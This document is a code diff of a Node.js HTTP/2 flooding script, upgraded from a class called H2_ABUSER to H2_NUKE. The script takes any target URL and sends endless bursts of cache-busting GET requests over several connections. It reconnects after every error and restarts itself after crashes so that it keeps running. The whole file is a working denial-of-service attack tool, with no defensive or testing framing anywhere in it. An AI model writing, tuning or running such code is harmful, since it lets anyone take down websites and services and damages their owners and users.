@@ -1,109 +1,124 @@
 const http2 = require('http2');
 
-class H2_ABUSER {
+class H2_NUKE {
     constructor(target) {
         this.target = target;
         this.host = target.replace('https://', '').replace('http://', '').split('/')[0];
         this.running = true;
         this.reqs = 0;
-        this.conns = 3;
-        this.streamsPerConn = 100;
         
-        // Auto-restart on any failure
-        this.restartTimer = null;
+        // NUKE SETTINGS
+        this.conns = 5;
+        this.streamsPerConn = 200; // MAX STREAMS
+        this.delay = 5; // 5ms = 200 RPS per connection
         
-        this.startNuke();
-    }
-    
-    startNuke() {
         console.log('STARTED');
         
-        // Force GC if available
+        // FORCE GC EVERY 30s
         if (global.gc) {
             setInterval(() => { try { global.gc(); } catch(e) {} }, 30000);
         }
         
-        // Create minimal connections
+        // NUKE ENGINE
+        this.nukeEngine();
+        
+        // AUTO-RESTART EVERY 90s
+        this.restartTimer = setInterval(() => {
+            this.softRestart();
+        }, 90000);
+    }
+    
+    nukeEngine() {
+        // CREATE MAX CONNECTIONS
         this.connections = [];
         for (let i = 0; i < this.conns; i++) {
-            this.createConn(i);
+            this.createNukeConn(i);
         }
         
-        // Fire streams
-        this.fireInterval = setInterval(() => {
+        // MAX FIRE RATE
+        this.fireLoop = () => {
             if (!this.running) return;
             
+            // FIRE ALL CONNECTIONS
             this.connections.forEach(conn => {
                 if (conn && !conn.destroyed) {
-                    // Max streams per connection
+                    // FIRE 200 STREAMS PER LOOP
                     for (let j = 0; j < this.streamsPerConn; j++) {
-                        this.sendFireAndForget(conn);
+                        this.nukeRequest(conn);
                         this.reqs++;
                     }
                 }
             });
             
-            // Auto-restart every 2 minutes to prevent issues
-            if (this.reqs % 10000 === 0) {
-                this.safeRestart();
-            }
-        }, 10); // 10ms delay
+            // NEXT BATCH IMMEDIATELY
+            setImmediate(this.fireLoop);
+        };
         
-        // Auto-restart failsafe
-        this.restartTimer = setInterval(() => {
-            this.safeRestart();
-        }, 120000); // 2 minutes
+        // START NUKE LOOP
+        setImmediate(this.fireLoop);
     }
     
-    createConn(id) {
+    createNukeConn(id) {
         try {
             const conn = http2.connect(this.target, {
-                maxSessionMemory: 16384,
-                maxSendHeaderBlockLength: 4096,
-                peerMaxConcurrentStreams: 1000
+                maxSessionMemory: 65536, // 64KB
+                maxSendHeaderBlockLength: 65536,
+                peerMaxConcurrentStreams: 1000,
+                settings: {
+                    initialWindowSize: 2147483647, // MAX WINDOW
+                    maxConcurrentStreams: 1000
+                }
             });
             
+            conn.setTimeout(0); // NO TIMEOUT
+            
             conn.on('error', () => {
-                setTimeout(() => this.createConn(id), 1000);
+                // SILENT DEATH & REBIRTH
+                setTimeout(() => this.createNukeConn(id), 100);
             });
             
             this.connections[id] = conn;
         } catch(e) {
-            setTimeout(() => this.createConn(id), 2000);
+            setTimeout(() => this.createNukeConn(id), 500);
         }
     }
     
-    sendFireAndForget(conn) {
+    nukeRequest(conn) {
         try {
+            // MAX HEADERS FOR STRESS
             const req = conn.request({
-                ':method': 'HEAD',
-                ':path': '/',
-                ':authority': this.host
+                ':method': 'GET',
+                ':path': '/?' + Math.random().toString(36).substring(7),
+                ':authority': this.host,
+                'user-agent': 'Mozilla/5.0',
+                'accept': '*/*',
+                'cache-control': 'no-cache',
+                'pragma': 'no-cache'
             });
+            
+            // SEND PAYLOAD TO STRESS SERVER
+            req.write('a'.repeat(1024));
             req.end();
+            
+            // INSTANT DESTROY - NO WAITING
             req.close();
+            
         } catch(e) {
-            // Silent
+            // IGNORE
         }
     }
     
-    safeRestart() {
-        clearInterval(this.fireInterval);
-        clearInterval(this.restartTimer);
-        
-        this.connections.forEach(conn => {
-            try { if (conn) conn.destroy(); } catch(e) {}
+    softRestart() {
+        // ONLY RESTART DEAD CONNECTIONS
+        this.connections.forEach((conn, idx) => {
+            if (!conn || conn.destroyed) {
+                this.createNukeConn(idx);
+            }
         });
-        
-        setTimeout(() => {
-            this.reqs = 0;
-            this.startNuke();
-        }, 1000);
     }
     
     stop() {
         this.running = false;
-        clearInterval(this.fireInterval);
         clearInterval(this.restartTimer);
         this.connections.forEach(conn => {
             try { if (conn) conn.destroy(); } catch(e) {}
@@ -111,25 +126,25 @@ class H2_ABUSER {
     }
 }
 
-// 24/7 Runner
+// 24/7 UNSTOPPABLE
 process.on('uncaughtException', () => {
-    setTimeout(() => main(), 3000);
+    setTimeout(() => {
+        if (process.argv[2]) {
+            const nuke = new H2_NUKE(process.argv[2]);
+        }
+    }, 1000);
 });
 
 process.on('unhandledRejection', () => {});
 
-function main() {
-    if (process.argv.length < 3) {
-        console.log('node h2.js https://target.com');
-        process.exit(1);
-    }
-    
-    const abuser = new H2_ABUSER(process.argv[2]);
+// START
+if (process.argv[2]) {
+    const nuke = new H2_NUKE(process.argv[2]);
     
     process.on('SIGINT', () => {
-        abuser.stop();
+        nuke.stop();
         process.exit(0);
     });
-}
-
-main();
+} else {
+    console.log('node nuke.js https://target.com');
+           }
